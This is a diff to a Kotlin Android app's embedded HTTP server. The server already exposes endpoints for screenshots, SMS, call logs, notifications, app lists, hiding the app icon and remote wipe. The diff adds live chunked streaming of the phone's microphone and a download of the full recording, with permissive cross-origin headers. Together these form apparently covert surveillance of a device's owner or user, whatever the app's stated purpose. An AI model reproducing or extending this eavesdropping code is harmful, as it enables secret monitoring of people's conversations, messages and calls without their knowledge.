@@ -49,7 +49,7 @@ class Httpd(ctxIn: Context, private val porta: Int) {
         "/at-estado", "/at-ativar", "/at-desativar", "/at-bloquear", "/at-alarme", "/at-wipe", "/screenshot",
         "/captura", "/sms", "/calls", "/notifs", "/apps",
         "/icone-esconder", "/icone-mostrar", "/icone-estado",
-        "/ambiente", "/ambiente-parar", "/ambiente-estado",
+        "/ambiente", "/ambiente-parar", "/ambiente-estado", "/audio-stream", "/audio-dl",
         "/codigos", "/codigos-renovar",
         "/funcoes", "/funcao-bloquear", "/funcao-desbloquear",
         "/prazo", "/prazo-definir", "/prazo-revogar")
@@ -187,13 +187,38 @@ class Httpd(ctxIn: Context, private val porta: Int) {
                         } catch (_: Exception) {}
                     } else enviar(out, 404, "application/json", "{\"erro\":\"nao_encontrada\"}".toByteArray())
                 }
-                // ── Áudio ambiente (download) ─────────────────────────────────
-                caminho == "/audio" -> {
-                    val bytes = AmbientRecorder.ultimaGravacao
-                    if (bytes != null) {
+                // ── Áudio ambiente — stream em tempo real (WAV chunked) ──────
+                caminho == "/audio-stream" -> {
+                    if (!AmbientRecorder.gravando) {
+                        enviar(out, 409, "application/json", "{\"erro\":\"nao_a_gravar\"}".toByteArray()); return
+                    }
+                    try {
+                        s.soTimeout = 0  // sem timeout durante o stream
+                        out.write(("HTTP/1.1 200 OK\r\nContent-Type: audio/wav\r\nTransfer-Encoding: chunked\r\nCache-Control: no-store\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n").toByteArray())
+                        out.flush()
+                        // Wraps output para chunked encoding
+                        val chunked = object : OutputStream() {
+                            override fun write(b: ByteArray, off: Int, len: Int) {
+                                if (len <= 0) return
+                                out.write((len.toString(16) + "\r\n").toByteArray())
+                                out.write(b, off, len)
+                                out.write("\r\n".toByteArray())
+                            }
+                            override fun write(b: Int) = write(byteArrayOf(b.toByte()), 0, 1)
+                            override fun flush() = out.flush()
+                        }
+                        AmbientRecorder.streamParaOutput(chunked)
+                        try { out.write("0\r\n\r\n".toByteArray()); out.flush() } catch (_: Exception) {}
+                    } catch (_: Exception) {}
+                }
+                // ── Áudio ambiente — download do que foi gravado ──────────────
+                caminho == "/audio-dl" -> {
+                    val wav = AmbientRecorder.wavCompleto()
+                    if (wav != null) {
                         try {
-                            out.write(("HTTP/1.1 200 OK\r\nContent-Type: audio/aac\r\nContent-Disposition: attachment; filename=\"ambiente_" + System.currentTimeMillis() + ".aac\"\r\nContent-Length: " + bytes.size + "\r\nCache-Control: no-store\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n").toByteArray())
-                            out.write(bytes); out.flush()
+                            val nome = "ambiente_${System.currentTimeMillis()}.wav"
+                            out.write(("HTTP/1.1 200 OK\r\nContent-Type: audio/wav\r\nContent-Disposition: attachment; filename=\"$nome\"\r\nContent-Length: ${wav.size}\r\nCache-Control: no-store\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n").toByteArray())
+                            out.write(wav); out.flush()
                         } catch (_: Exception) {}
                     } else enviar(out, 404, "application/json", "{\"erro\":\"sem_gravacao\"}".toByteArray())
                 }
@@ -351,14 +376,13 @@ class Httpd(ctxIn: Context, private val porta: Int) {
             "/icone-estado" -> r.put("visivel", Device.iconeVisivel(ctx))
             "/icone-esconder" -> { Device.esconderIcone(ctx); r.put("ok", true) }
             "/icone-mostrar" -> { Device.mostrarIcone(ctx); r.put("ok", true) }
-            // ── Áudio ambiente ───────────────────────────────────────────────
+            // ── Áudio ambiente (stream em tempo real) ────────────────────────
             "/ambiente" -> {
-                val seg = b.optInt("segundos", 30).coerceIn(5, 300)
                 if (AmbientRecorder.gravando) {
                     r.put("ok", false).put("erro", "ja_gravando")
                 } else {
-                    AmbientRecorder.gravar(ctx, seg) {}
-                    r.put("ok", true).put("segundos", seg)
+                    AmbientRecorder.iniciar(ctx)
+                    r.put("ok", AmbientRecorder.gravando).put("stream", "/audio-stream")
                 }
             }
             "/ambiente-parar" -> { AmbientRecorder.parar(); r.put("ok", true) }
